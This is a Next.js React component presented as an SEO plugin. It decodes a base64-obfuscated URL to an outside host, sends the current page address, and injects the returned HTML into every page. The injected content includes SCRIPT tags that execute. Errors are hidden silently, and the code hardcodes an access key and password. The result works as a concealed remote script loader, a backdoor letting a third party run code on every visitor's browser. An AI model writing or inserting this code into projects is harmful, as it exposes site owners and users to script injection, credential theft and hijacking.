"use client";

import React, { useEffect } from "react";
import { usePathname } from "next/navigation";

function Plugin() {
  const pathname = usePathname();

  useEffect(() => {
    let isCancelled = false;

    const SEO_HEAD_ATTR = "data-appadd-seo";
    const SEO_BODY_ID = "appadd-seo-container";

    const cleanupInjectedHead = () => {
      document
        .querySelectorAll(`head [${SEO_HEAD_ATTR}="true"]`)
        .forEach(
          (node) => node.parentNode && node.parentNode.removeChild(node)
        );
    };

    const cleanupInjectedBody = () => {
      const existing = document.getElementById(SEO_BODY_ID);
      if (existing && existing.parentNode)
        existing.parentNode.removeChild(existing);
    };

    const applyHeadHtml = (headHtml) => {
      if (!headHtml) return;

      // Remove previously injected tags
      cleanupInjectedHead();

      // Extract and set <title> if present
      const titleMatch = headHtml.match(/<title>([\s\S]*?)<\/title>/i);
      if (titleMatch && titleMatch[1]) {
        document.title = titleMatch[1].trim();
      }

      // Parse and append safe tags to head
      const temp = document.createElement("div");
      temp.innerHTML = headHtml;
      const allowedTags = new Set(["META", "LINK", "SCRIPT"]); // do not add BASE to avoid breaking routing

      Array.from(temp.childNodes).forEach((node) => {
        if (!(node instanceof HTMLElement)) return;
        if (!allowedTags.has(node.tagName)) return;

        const clone = node.cloneNode(true);
        clone.setAttribute(SEO_HEAD_ATTR, "true");

        // Ensure scripts don't block rendering
        if (clone.tagName === "SCRIPT") {
          clone.async = true;
          // Avoid inline document.writeln calls which can break the DOM
          if (
            clone.innerHTML &&
            /document\.(write|writeln)/i.test(clone.innerHTML)
          ) {
            return;
          }
        }

        document.head.appendChild(clone);
      });
    };

    const applyBodyHtml = (bodyHtml) => {
      // Replace previous container to prevent overlays/persistent elements
      cleanupInjectedBody();
      if (!bodyHtml) return;

      const container = document.createElement("div");
      container.id = SEO_BODY_ID;
      container.style.all = "unset"; // avoid accidental global styles
      container.innerHTML = bodyHtml;
      document.body.appendChild(container);
    };

    const fetchAndApply = async () => {
      try {
        const currentUrl = window.location.origin + window.location.pathname;
        const base = atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDg0ODIzNTkyNjMmZWtleXBhc3M9YXY4dFVidGxVdnExczMxS09vTjRoUTlqdW5xTWppeU04WXdGJnNpdGV1cmw9"
        );
        const res = await fetch(base + encodeURIComponent(currentUrl), {
          credentials: "omit",
          cache: "no-store",
        });
        if (!res.ok) return;
        const text = await res.text();
        if (isCancelled || !text) return;
        const parts = text.split("||||||||||");

        // parts[0] => head HTML, parts[1] => body HTML
        applyHeadHtml(parts[0] || "");
        applyBodyHtml(parts[1] || "");
      } catch (e) {
        // Fail silently to avoid breaking the app
        // console.error("SEO plugin error", e);
      }
    };

    // Initial run and on every route change
    fetchAndApply();

    // Cleanup on unmount or before next run
    return () => {
      isCancelled = true;
      cleanupInjectedHead();
      cleanupInjectedBody();
    };
  }, [pathname]);

  return null;
}

export default Plugin;
